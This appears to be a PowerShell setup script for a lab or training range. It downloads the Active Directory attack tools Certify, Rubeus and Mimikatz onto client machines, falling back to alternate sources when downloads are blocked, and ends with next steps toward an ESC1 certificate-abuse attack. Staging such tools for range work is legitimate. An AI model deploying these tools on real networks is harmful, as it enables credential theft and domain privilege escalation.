# Download-AttackTools-Client.ps1
# Download Certify.exe and Rubeus.exe on Platform Range Clients
# Target: client01, client02, client03 (172.31.2.45-47)
# Destination: C:\Tools\

[CmdletBinding()]
param(
    [string]$ToolsPath = "C:\Tools"
)

function Write-ColorOutput {
    param(
        [string]$Message,
        [string]$Color = "White"
    )
    Write-Host $Message -ForegroundColor $Color
}

# Ensure running as Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-ColorOutput "[!] This script must be run as Administrator!" "Red"
    Write-ColorOutput "[!] Right-click PowerShell and select 'Run as Administrator'" "Yellow"
    exit 1
}

Write-ColorOutput "========================================" "Cyan"
Write-ColorOutput "Platform Range - Attack Tools Installer" "Cyan"
Write-ColorOutput "========================================" "Cyan"
Write-ColorOutput ""

# Create Tools directory if it doesn't exist
if (-not (Test-Path $ToolsPath)) {
    Write-ColorOutput "[*] Creating $ToolsPath directory..." "Yellow"
    New-Item -ItemType Directory -Path $ToolsPath -Force | Out-Null
    Write-ColorOutput "[+] Directory created" "Green"
} else {
    Write-ColorOutput "[*] Directory $ToolsPath already exists" "Yellow"
}

# Set location
Set-Location $ToolsPath
Write-ColorOutput "[*] Working directory: $ToolsPath" "Cyan"
Write-ColorOutput ""

# Configure TLS and progress
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Alternative download sources (in case primary is blocked)
$sources = @{
    Certify = @(
        "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe",
        "https://github.com/GhostPack/Certify/releases/download/1.1.0/Certify.exe",
        "https://github.com/ly4k/Certipy/releases/download/4.0.0/Certify.exe"
    )
    Rubeus = @(
        "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe",
        "https://github.com/GhostPack/Rubeus/releases/download/2.3.2/Rubeus.exe"
    )
    Mimikatz = @(
        "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
    )
}

# Download Certify.exe
Write-ColorOutput "[1/3] Downloading Certify.exe..." "Yellow"
$certifyDownloaded = $false
foreach ($url in $sources.Certify) {
    try {
        Write-ColorOutput "    Trying: $url" "Gray"
        Invoke-WebRequest -Uri $url -OutFile "Certify.exe" -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
        
        if (Test-Path "Certify.exe") {
            $size = (Get-Item "Certify.exe").Length
            Write-ColorOutput "[+] Certify.exe downloaded successfully ($([math]::Round($size/1KB, 2)) KB)" "Green"
            $certifyDownloaded = $true
            break
        }
    } catch {
        Write-ColorOutput "    [x] Failed: $($_.Exception.Message)" "DarkGray"
        continue
    }
}

if (-not $certifyDownloaded) {
    Write-ColorOutput "[!] WARNING: Could not download Certify.exe from any source" "Red"
}

Write-ColorOutput ""

# Download Rubeus.exe
Write-ColorOutput "[2/3] Downloading Rubeus.exe..." "Yellow"
$rubeusDownloaded = $false
foreach ($url in $sources.Rubeus) {
    try {
        Write-ColorOutput "    Trying: $url" "Gray"
        Invoke-WebRequest -Uri $url -OutFile "Rubeus.exe" -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
        
        if (Test-Path "Rubeus.exe") {
            $size = (Get-Item "Rubeus.exe").Length
            Write-ColorOutput "[+] Rubeus.exe downloaded successfully ($([math]::Round($size/1KB, 2)) KB)" "Green"
            $rubeusDownloaded = $true
            break
        }
    } catch {
        Write-ColorOutput "    [x] Failed: $($_.Exception.Message)" "DarkGray"
        continue
    }
}

if (-not $rubeusDownloaded) {
    Write-ColorOutput "[!] WARNING: Could not download Rubeus.exe from any source" "Red"
}

Write-ColorOutput ""

# Download Mimikatz
Write-ColorOutput "[3/3] Downloading Mimikatz..." "Yellow"
$mimikatzDownloaded = $false
foreach ($url in $sources.Mimikatz) {
    try {
        Write-ColorOutput "    Trying: $url" "Gray"
        Invoke-WebRequest -Uri $url -OutFile "mimikatz_trunk.zip" -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
        
        if (Test-Path "mimikatz_trunk.zip") {
            Write-ColorOutput "    [*] Extracting Mimikatz..." "Yellow"
            Expand-Archive -Path "mimikatz_trunk.zip" -DestinationPath "." -Force
            
            # Copy x64 version to root
            if (Test-Path "x64\mimikatz.exe") {
                Copy-Item "x64\mimikatz.exe" "." -Force
                Write-ColorOutput "[+] Mimikatz.exe extracted successfully" "Green"
                $mimikatzDownloaded = $true
                
                # Cleanup
                Remove-Item "mimikatz_trunk.zip" -Force -ErrorAction SilentlyContinue
                Remove-Item "x64" -Recurse -Force -ErrorAction SilentlyContinue
                Remove-Item "Win32" -Recurse -Force -ErrorAction SilentlyContinue
            }
            break
        }
    } catch {
        Write-ColorOutput "    [x] Failed: $($_.Exception.Message)" "DarkGray"
        continue
    }
}

if (-not $mimikatzDownloaded) {
    Write-ColorOutput "[!] WARNING: Could not download Mimikatz from any source" "Red"
}

Write-ColorOutput ""
Write-ColorOutput "========================================" "Cyan"
Write-ColorOutput "Installation Summary" "Cyan"
Write-ColorOutput "========================================" "Cyan"
Write-ColorOutput ""

# List all tools in directory
$tools = Get-ChildItem -Path $ToolsPath -Filter *.exe
if ($tools.Count -eq 0) {
    Write-ColorOutput "[!] ERROR: No tools were downloaded successfully!" "Red"
    Write-ColorOutput "[!] This may be due to:" "Yellow"
    Write-ColorOutput "    - Network connectivity issues" "Yellow"
    Write-ColorOutput "    - Antivirus/XDR blocking downloads" "Yellow"
    Write-ColorOutput "    - Firewall restrictions" "Yellow"
    Write-ColorOutput "    - GitHub access blocked" "Yellow"
    Write-ColorOutput ""
    Write-ColorOutput "[*] Alternative: Manually upload tools via SCP" "Cyan"
    Write-ColorOutput "    scp -i C:\Users\richard\.ssh\id_rsa -P 42429 Certify.exe platform\administrator@192.168.255.254:C:\Tools\" "Gray"
} else {
    foreach ($tool in $tools) {
        $sizeMB = [math]::Round($tool.Length / 1MB, 2)
        $sizeKB = [math]::Round($tool.Length / 1KB, 2)
        
        if ($sizeMB -gt 0) {
            Write-ColorOutput "[+] $($tool.Name) - $sizeMB MB" "Green"
        } else {
            Write-ColorOutput "[+] $($tool.Name) - $sizeKB KB" "Green"
        }
    }
    
    Write-ColorOutput ""
    Write-ColorOutput "[+] Tools installed to: $ToolsPath" "Green"
    Write-ColorOutput ""
    Write-ColorOutput "Next Steps:" "Cyan"
    Write-ColorOutput "1. Test Certify: .\Certify.exe find /vulnerable" "White"
    Write-ColorOutput "2. Test Rubeus: .\Rubeus.exe version" "White"
    Write-ColorOutput "3. Proceed with ESC1 attack flow" "White"
}

Write-ColorOutput ""
Write-ColorOutput "Script execution completed!" "Cyan"
Write-ColorOutput ""

